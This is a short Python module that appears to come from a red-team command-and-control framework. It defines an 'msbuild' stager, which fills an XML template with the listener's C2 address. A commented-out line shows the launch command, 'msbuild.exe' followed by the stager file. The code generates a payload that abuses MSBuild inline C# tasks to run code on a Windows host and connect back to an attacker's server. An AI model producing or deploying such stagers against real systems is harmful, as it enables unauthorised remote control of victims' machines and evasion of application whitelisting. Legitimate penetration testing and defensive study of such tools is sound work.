from core.teamserver.stager import Stager

class STStager(Stager):
    def __init__(self):
        self.name = 'msbuild'
        self.description = 'Stage via MSBuild XML inline C# task'
        self.suggestions = ''
        self.extension = 'xml'
        self.author = '@byt3bl33d3r'
        self.options = {}

    def generate(self, listener):
        with open('stagers/templates/msbuild.xml') as template:
            template = template.read()
            template = template.replace('C2_URL', f"{listener.name}://{listener['BindIP']}:{listener['Port']}")
            return template

            #print_good(f"Generated stager to {stager.name}")
            #print_info(
            #    f"Launch with 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe {stager_filename}'")